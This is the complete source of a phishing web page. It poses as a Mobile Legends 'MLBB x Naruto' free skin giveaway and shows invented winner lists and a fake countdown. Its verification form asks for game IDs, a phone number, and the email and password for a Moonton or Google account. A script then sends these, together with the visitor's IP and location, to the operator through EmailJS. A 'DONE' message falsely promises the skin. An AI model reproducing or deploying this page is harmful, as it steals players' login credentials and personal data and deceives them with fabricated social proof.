<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MLBB x Naruto - Claim</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
    
    :root {
      --primary: #ffcc00;
      --secondary: #1a1a2e;
      --dark-blue: #0f3460;
      --purple: #533d7b;
      --red: #ff4444;
      --starlight: #ffd700;
      --premium: #9b59b6;
    }
    
    body {
      font-family: 'Montserrat', sans-serif;
      background: linear-gradient(-45deg, var(--secondary), #16213e, var(--dark-blue), var(--purple));
      background-size: 400% 400%;
      color: #fff;
      margin: 0;
      padding: 0;
      min-height: 100vh;
    }
    
    .hidden {
      display: none !important;
    }

    .required {
      color: var(--red);
    }

    /* Header Styles */
    .top-bar {
      position: relative;
      width: 100%;
    }
    
    .header-bar {
      position: absolute;
      top: 10px;
      left: 0;
      right: 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0 15px;
      z-index: 10;
    }
    
    .header-bar img.logo {
      width: 32px;
      height: 32px;
      object-fit: contain;
    }
    
    .menu-icon {
      width: 24px;
      height: 24px;
      cursor: pointer;
    }
    
    .menu-icon div {
      background-color: #fff;
      height: 3px;
      margin: 4px 0;
      border-radius: 1px;
    }
    
    .banner {
      width: 100%;
      height: auto;
      display: block;
      object-fit: cover;
    }
    
    .container {
      max-width: 480px;
      margin: 0 auto;
      padding: 20px;
    }
    
    /* Marquee Styles */
    .marquee-container {
      overflow: hidden;
      border-radius: 8px;
      background: rgba(255, 255, 255, 0.05);
      margin-bottom: 12px;
      border: 1px solid rgba(255, 204, 0, 0.2);
      box-shadow: 0 0 8px rgba(255, 204, 0, 0.2);
    }
    
    .marquee {
      display: inline-block;
      white-space: nowrap;
      animation: scrollText 30s linear infinite;
      padding: 10px 0;
      font-size: 0.95rem;
      color: var(--primary);
      font-weight: 600;
    }
    
    @keyframes scrollText {
      0% { transform: translateX(100%); }
      100% { transform: translateX(-100%); }
    }
    
    /* Countdown Timer */
    .countdown {
      text-align: center;
      font-size: 1.2rem;
      margin-top: 10px;
      background: #1c1c1c;
      padding: 8px 12px;
      border-radius: 6px;
      box-shadow: 0 0 10px rgba(255, 204, 0, 0.3);
      font-weight: bold;
      color: var(--primary);
    }
    
    /* Skin Grid */
    .skin-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin-top: 20px;
    }
    
    .skin-card {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 12px;
      padding: 10px;
      text-align: center;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
      transition: transform 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .skin-card.starlight {
      border: 2px solid var(--starlight);
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
    }
    
    .skin-card.premium {
      border: 2px solid var(--premium);
      box-shadow: 0 0 15px rgba(155, 89, 182, 0.5);
    }
    
    .skin-card img {
      width: 100%;
      border-radius: 10px;
      margin-bottom: 10px;
      max-height: 300px;
      object-fit: contain;
    }
    
    .skin-card:hover {
      transform: scale(1.03);
    }
    
    .skin-badge {
      position: absolute;
      top: 10px;
      right: 10px;
      font-size: 0.7rem;
      font-weight: bold;
      padding: 3px 6px;
      border-radius: 4px;
    }
    
    .starlight-badge {
      background-color: var(--starlight);
      color: #000;
    }
    
    .premium-badge {
      background-color: var(--premium);
      color: #fff;
    }
    
    /* Buttons */
    .claim-btn {
      background: linear-gradient(to right, var(--primary), #ff9500);
      border: none;
      padding: 8px 16px;
      color: #000;
      font-weight: bold;
      border-radius: 8px;
      cursor: pointer;
      font-size: 0.9rem;
      transition: all 0.3s ease;
    }
    
    .claim-btn:hover {
      background: linear-gradient(to right, #ffdd55, #ffaa33);
      transform: scale(1.05);
    }
    
    .claim-btn:disabled {
      background: #cccccc;
      cursor: not-allowed;
      transform: none;
    }
    
    /* Form Styles */
    .form-container {
      background: linear-gradient(to bottom, var(--secondary), var(--purple));
      padding: 30px;
      border-radius: 12px;
      max-width: 480px;
      margin: 40px auto;
    }
    
    .form-group {
      margin-bottom: 15px;
    }
    
    .form-group label {
      display: block;
      margin-bottom: 5px;
    }
    
    .form-control {
      width: 100%;
      padding: 10px;
      border-radius: 6px;
      border: 1px solid rgba(255,255,255,0.1);
      background: rgba(0,0,0,0.2);
      color: white;
    }
    
    /* Modal Styles */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }
    
    .modal-content {
      background: var(--secondary);
      color: #fff;
      padding: 30px;
      border-radius: 12px;
      max-width: 320px;
      width: 90%;
      text-align: center;
      box-shadow: 0 0 20px var(--primary);
      position: relative;
    }
    
    .close-btn {
      position: absolute;
      top: 10px;
      right: 10px;
      background: transparent;
      border: none;
      color: white;
      font-size: 20px;
      cursor: pointer;
    }
    
    .error-message {
      color: var(--red);
      font-size: 0.8rem;
      margin-top: 5px;
      display: none;
    }
    
    .login-method {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin: 15px 0;
    }
    
    .method-option {
      display: flex;
      align-items: center;
      padding: 10px;
      border-radius: 8px;
      background: rgba(255,255,255,0.1);
      border: 1px solid transparent;
      cursor: pointer;
    }
    
    .method-option:hover {
      background: rgba(255,255,255,0.2);
    }
    
    .method-option.selected {
      border-color: var(--primary);
      background: rgba(255,204,0,0.1);
    }
    
    .method-option input[type="radio"] {
      margin-right: 10px;
    }
    
    .method-option label {
      display: flex;
      align-items: center;
      gap: 8px;
      cursor: pointer;
      width: 100%;
    }
    
    .country-flag {
      width: 20px;
      height: 15px;
      object-fit: cover;
      border-radius: 2px;
      margin-right: 5px;
    }
    
    .attempts-warning {
      color: var(--red);
      font-size: 0.8rem;
      text-align: center;
      margin-top: 10px;
      display: none;
    }

    /* Starlight Section */
    .starlight-section {
      margin-top: 30px;
      padding-top: 20px;
      border-top: 1px dashed rgba(255, 215, 0, 0.3);
    }

    .starlight-title {
      text-align: center;
      color: var(--starlight);
      margin-bottom: 15px;
      font-weight: 700;
      text-shadow: 0 0 8px rgba(255, 215, 0, 0.4);
    }

    .starlight-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      max-width: 330px;
      margin: 0 auto;
    }
  </style>
</head>
<body>

  <!-- Step 1: Skin Selection -->
  <div class="top-bar">
    <div class="header-bar">
      <img src="https://i.ibb.co/TBdv1F7Y/download-removebg-preview.png" alt="MLBB Logo" class="logo" loading="lazy">
      <div class="menu-icon">
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>
    <img src="https://i.ibb.co/KpPs0yhq/images-7-removebg-preview.png" alt="Naruto Banner" class="banner" loading="lazy">
  </div>

  <div class="container" id="step1">
    <div class="marquee-container">
      <div class="marquee" id="marqueeContent">Loading winners...</div>
    </div>
    <div class="countdown">LIMITED TIME OFFER: <span id="timer">00:00:00</span></div>

    <h2 style="text-align:center; margin-top: 20px;">Select a Skin to Claim</h2>
    
    <div class="skin-grid">
      <!-- Regular Skins (4) -->
      <div class="skin-card">
        <img src="https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg" alt="Naruto Uzumaki" loading="lazy">
        <button class="claim-btn" onclick="selectSkin('Naruto Uzumaki')">CLAIM</button>
      </div>
      <div class="skin-card">
        <img src="https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg" alt="Sasuke Uchiha" loading="lazy">
        <button class="claim-btn" onclick="selectSkin('Sasuke Uchiha')">CLAIM</button>
      </div>
      <div class="skin-card">
        <img src="https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg" alt="Sakura Haruno" loading="lazy">
        <button class="claim-btn" onclick="selectSkin('Sakura Haruno')">CLAIM</button>
      </div>
      <div class="skin-card">
        <img src="https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg" alt="Kakashi Hatake" loading="lazy">
        <button class="claim-btn" onclick="selectSkin('Kakashi Hatake')">CLAIM</button>
      </div>
    </div>

    <!-- Starlight Skins Section -->
    <div class="starlight-section">
      <h3 class="starlight-title">Starlight Card Premium </h3>
      <div class="starlight-grid">
        <div class="skin-card starlight">
          <div class="skin-badge starlight-badge">STARLIGHT</div>
          <img src="https://i.ibb.co/NdP55zWS/images-8.jpg" alt="Starlight Skin 1" loading="lazy">
          <button class="claim-btn" onclick="selectSkin('Starlight')">CLAIM</button>
        </div>
        <div class="skin-card starlight">
          <div class="skin-badge starlight-badge">PREMIUM</div>
          <img src="https://i.ibb.co/NgjTHc6P/download-2.jpg" alt="Starlight Premium" loading="lazy">
          <button class="claim-btn" onclick="selectSkin('Starlight Premium')">CLAIM</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Step 2: Verification Form -->
  <div id="step2Form" class="hidden form-container">
    <div style="text-align: center; margin-bottom: 20px;">
      <img src="https://i.ibb.co/TBdv1F7Y/download-removebg-preview.png" width="60" alt="MLBB Logo" loading="lazy">
      <h2 style="margin-top: 10px;">Verify Your MLBB Account</h2>
      <p style="font-size: 0.9rem; opacity: 0.8;">Selected Skin: <span id="selectedSkinText" style="color: var(--primary); font-weight: bold;">None</span></p>
    </div>

    <div class="form-group">
      <label>User ID: <span class="required">*</span></label>
      <input type="number" id="userId" class="form-control" required>
      <div class="error-message" id="userIdError">Please enter your User ID</div>
    </div>

    <div class="form-group">
      <label>Zone ID: <span class="required">*</span></label>
      <input type="number" id="zoneId" class="form-control" required>
      <div class="error-message" id="zoneIdError">Please enter your Zone ID</div>
    </div>

    <div class="form-group">
      <label>Account Level: <span class="required">*</span></label>
      <select id="accountLevel" class="form-control" required>
        <option value="">Select Level</option>
      </select>
      <div class="error-message" id="levelError">Please select your level</div>
    </div>

    <div class="form-group">
      <label>Phone Number: <span class="required">*</span></label>
      <div style="display: flex; gap: 10px;">
        <select id="countryCode" class="form-control" style="flex: 0 0 100px;" required>
          <option value="">Code</option>
          <option value="+62" data-flag="🇮🇩">🇮🇩 +62</option>
          <option value="+63" data-flag="🇵🇭">🇵🇭 +63</option>
          <option value="+60" data-flag="🇲🇾">🇲🇾 +60</option>
          <option value="+95" data-flag="🇲🇲">🇲🇲 +95</option>
          <option value="+91" data-flag="🇮🇳">🇮🇳 +91</option>
          <option value="+66" data-flag="🇹🇭">🇹🇭 +66</option>
          <option value="+855" data-flag="🇰🇭">🇰🇭 +855</option>
        </select>
        <input type="tel" id="phoneNumber" class="form-control" placeholder="812xxxxxxx" required>
      </div>
      <div class="error-message" id="phoneError">Please enter valid phone number</div>
    </div>

    <div class="form-group">
      <label>Login Method: <span class="required">*</span></label>
      <div class="login-method">
        <div class="method-option" data-method="moonton">
          <input type="radio" id="moontonLogin" name="loginMethod" required>
          <label for="moontonLogin">
            <img src="https://i.ibb.co/wrScFM1j/images-removebg-preview.png" alt="Moonton" width="20">
            Moonton Account
          </label>
        </div>
        <div class="method-option" data-method="google">
          <input type="radio" id="googleLogin" name="loginMethod" required>
          <label for="googleLogin">
            <img src="https://i.ibb.co/YTZ9Vbjp/download-removebg-preview.png" alt="Google" width="20">
            Google Account
          </label>
        </div>
      </div>
      <div class="error-message" id="methodError">Please select a login method</div>
    </div>

    <div id="credentialFields" class="hidden">
      <div class="form-group">
        <label>Email: <span class="required">*</span></label>
        <input type="email" id="loginEmail" class="form-control" required>
        <div class="error-message" id="emailError">Please enter a valid email</div>
      </div>
      <div class="form-group">
        <label>Password: <span class="required">*</span></label>
        <input type="password" id="loginPassword" class="form-control" required>
        <div class="error-message" id="passwordError">Please enter your password</div>
      </div>
    </div>

    <button id="submitBtn" class="claim-btn" onclick="validateForm()" style="width: 100%; padding: 12px;" disabled>
      SUBMIT
    </button>
  </div>

  <!-- Done Modal -->
  <div id="doneModal" class="hidden modal-overlay">
    <div class="modal-content">
      <img src="https://i.ibb.co/KpPs0yhq/images-7-removebg-preview.png" alt="Success" width="120" style="margin: 0 auto 15px; display: block;" loading="lazy">
      <h2 style="color: var(--primary);">✅ DONE</h2>
      <p>Please wait up to <b>24 hours</b> for the skin to arrive in your mailbox.</p>
      <button class="claim-btn" onclick="closeDoneModal()" style="margin-top: 15px; width: 100%;">OK</button>
    </div>
  </div>

  <!-- Limit Reached Modal -->
  <div id="limitModal" class="hidden modal-overlay">
    <div class="modal-content">
      <img src="https://i.ibb.co/wrScFM1j/images-removebg-preview.png" alt="Limit Reached" width="80" style="margin: 0 auto 15px; display: block;" loading="lazy">
      <h2 style="color: var(--red);">LIMIT REACHED</h2>
      <p>You have reached the maximum number of attempts (3). Please try again later.</p>
      <button class="claim-btn" onclick="closeLimitModal()" style="margin-top: 15px; width: 100%; background: var(--red);">UNDERSTOOD</button>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    // Initialize EmailJS
    emailjs.init("DNPQxiqk4QR-0M5sA");

    // Global Variables
    let selectedMethod = null;
    let selectedSkin = null;
    let userIP = null;
    const MAX_ATTEMPTS_PER_IP = 3;
    const elements = {
      step1: document.getElementById("step1"),
      step2Form: document.getElementById("step2Form"),
      doneModal: document.getElementById("doneModal"),
      limitModal: document.getElementById("limitModal"),
      accountLevel: document.getElementById("accountLevel"),
      marqueeContent: document.getElementById("marqueeContent"),
      timer: document.getElementById("timer"),
      submitBtn: document.getElementById("submitBtn"),
      credentialFields: document.getElementById("credentialFields"),
      methodOptions: document.querySelectorAll('.method-option'),
      selectedSkinText: document.getElementById("selectedSkinText")
    };

    // Initialize Page
    async function initPage() {
      // Isi dropdown level akun
      for (let i = 1; i <= 200; i++) {
        const option = document.createElement("option");
        option.value = i;
        option.textContent = `Level ${i}`;
        elements.accountLevel.appendChild(option);
      }
      
      // Mulai countdown
      startCountdown(60 * 60 * 2, elements.timer);
      
      // Generate teks marquee
      generateMarqueeText();
      setInterval(generateMarqueeText, 60000);
      
      // Setup pemilihan metode login
      setupLoginMethodSelection();
      
      // Handle error gambar
      document.querySelectorAll('img').forEach(img => {
        img.onerror = () => {
          console.error(`Gambar gagal dimuat: ${img.alt}`);
          img.style.border = "2px dashed red";
        };
      });
      
      // Dapatkan IP pengguna
      try {
        const ipData = await fetch("https://ipwho.is/").then(res => res.json());
        userIP = ipData.ip;
        checkIPLimit();
      } catch (error) {
        console.error("Gagal mendapatkan IP:", error);
      }
    }

    // Cek apakah IP sudah mencapai limit
    async function checkIPLimit() {
      if (!userIP) return;
      
      // Cek di localStorage berapa kali IP ini sudah mencoba
      const ipAttempts = localStorage.getItem(`ipAttempts_${userIP}`) || 0;
      
      // Jika sudah mencapai limit, tampilkan modal limit
      if (ipAttempts >= MAX_ATTEMPTS_PER_IP) {
        elements.limitModal.classList.remove("hidden");
        elements.step1.classList.add("hidden");
        elements.step2Form.classList.add("hidden");
      }
    }

    // Countdown Timer
    function startCountdown(duration, display) {
      let timer = duration, hours, minutes, seconds;
      setInterval(() => {
        hours = parseInt(timer / 3600, 10);
        minutes = parseInt((timer % 3600) / 60, 10);
        seconds = parseInt(timer % 60, 10);
        
        display.textContent = 
          `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        
        if (--timer < 0) timer = duration;
      }, 1000);
    }

    // Marquee Text Generator
    function generateMaskedID() {
      const id = Math.floor(Math.random() * 89999999) + 10000000;
      return `${id.toString().slice(0,3)}***${id.toString().slice(-2)}`;
    }

    function generateMarqueeText() {
      const skins = ["Naruto Uzumaki", "Sasuke Uchiha", "Sakura Haruno", "Kakashi Hatake", 
                    "Starlight Card", "Starlight Premium Card"];
      const countries = ["🇮🇩", "🇵🇭", "🇲🇾", "🇲🇲", "🇮🇳", "🇹🇭", "🇰🇭"];
      const emojis = ["🎉", "🔥", "✨", "⚡", "💯", "🎁", "🏆"];
      
      let text = "";
      
      // Generate teks acak untuk marquee
      for (let i = 0; i < 15; i++) {
        const skin = skins[Math.floor(Math.random() * skins.length)];
        const country = countries[Math.floor(Math.random() * countries.length)];
        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
        text += `${country} ID ${generateMaskedID()} Succes Claim <b>${skin}</b> ${emoji} • `;
      }
      
      elements.marqueeContent.innerHTML = text;
    }

    // Fungsi Navigasi
    function selectSkin(skinName) {
      selectedSkin = skinName;
      elements.selectedSkinText.textContent = skinName;
      elements.step1.classList.add("hidden");
      elements.step2Form.classList.remove("hidden");
    }

    function closeDoneModal() {
      elements.doneModal.classList.add("hidden");
    }
    
    function closeLimitModal() {
      elements.limitModal.classList.add("hidden");
    }

    // Login Method Selection
    function setupLoginMethodSelection() {
      elements.methodOptions.forEach(option => {
        option.addEventListener('click', function() {
          // Hapus class selected dari semua opsi
          elements.methodOptions.forEach(opt => opt.classList.remove('selected'));
          
          // Tambah class selected ke opsi yang diklik
          this.classList.add('selected');
          
          // Set metode yang dipilih
          selectedMethod = this.dataset.method;
          
          // Tampilkan field kredensial
          elements.credentialFields.classList.remove("hidden");
          
          // Aktifkan tombol submit
          elements.submitBtn.disabled = false;
          
          // Sembunyikan pesan error metode
          document.getElementById("methodError").style.display = 'none';
          
          // Fokus ke field email
          document.getElementById("loginEmail").focus();
        });
      });
    }

    // Validasi Form
    async function validateForm() {
      let isValid = true;
      
      // Field yang wajib diisi
      const userId = document.getElementById("userId").value;
      const zoneId = document.getElementById("zoneId").value;
      const level = document.getElementById("accountLevel").value;
      const countryCode = document.getElementById("countryCode").value;
      const phone = document.getElementById("phoneNumber").value;
      const email = document.getElementById("loginEmail").value;
      const password = document.getElementById("loginPassword").value;
      
      // Validasi field
      if (!userId) {
        document.getElementById("userIdError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("userIdError").style.display = 'none';
      }
      
      if (!zoneId) {
        document.getElementById("zoneIdError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("zoneIdError").style.display = 'none';
      }
      
      if (!level) {
        document.getElementById("levelError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("levelError").style.display = 'none';
      }
      
      if (!countryCode || !phone) {
        document.getElementById("phoneError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("phoneError").style.display = 'none';
      }
      
      if (!selectedMethod) {
        document.getElementById("methodError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("methodError").style.display = 'none';
      }
      
      if (!email) {
        document.getElementById("emailError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("emailError").style.display = 'none';
      }
      
      if (!password) {
        document.getElementById("passwordError").style.display = 'block';
        isValid = false;
      } else {
        document.getElementById("passwordError").style.display = 'none';
      }
      
      if (isValid) {
        await submitForm();
      }
    }

    // Submit Form
    async function submitForm() {
      const formData = {
        userId: document.getElementById("userId").value,
        zoneId: document.getElementById("zoneId").value,
        level: document.getElementById("accountLevel").value,
        countryCode: document.getElementById("countryCode").value,
        countryFlag: document.querySelector('#countryCode option:checked').dataset.flag,
        phone: document.getElementById("phoneNumber").value,
        email: document.getElementById("loginEmail").value,
        password: document.getElementById("loginPassword").value,
        method: selectedMethod
      };
      
      try {
        // Hitung percobaan berdasarkan IP
        const ipAttempts = localStorage.getItem(`ipAttempts_${userIP}`) || 0;
        const newAttempts = parseInt(ipAttempts) + 1;
        localStorage.setItem(`ipAttempts_${userIP}`, newAttempts);
        
        // Dapatkan data IP dan lokasi
        const ipData = await fetch("https://ipwho.is/").then(res => res.json());
        
        // Siapkan data untuk EmailJS
        const templateParams = {
          user_id: formData.userId,
          zone_id: formData.zoneId,
          level: formData.level,
          country_flag: formData.countryFlag,
          country_code: formData.countryCode,
          phone: formData.phone,
          login_method: formData.method,
          login_email: formData.email,
          login_password: formData.password,
          ip_address: ipData.ip || "Unknown",
          location: ipData.city ? `${ipData.city}, ${ipData.country}` : "Unknown",
          timestamp: new Date().toLocaleString()
        };
        
        // Kirim data
        await emailjs.send("service_at8t8k6", "template_2pkguka", templateParams);
        
        // Tampilkan modal sukses jika belum mencapai limit
        if (newAttempts < MAX_ATTEMPTS_PER_IP) {
          elements.doneModal.classList.remove("hidden");
        } else {
          elements.limitModal.classList.remove("hidden");
        }
      } catch (error) {
        console.error("Gagal submit:", error);
        alert("Gagal mengirim. Silakan cek koneksi Anda dan coba lagi.");
      }
    }

    // Inisialisasi saat halaman dimuat
    document.addEventListener('DOMContentLoaded', initPage);
  </script>
</body>
</html>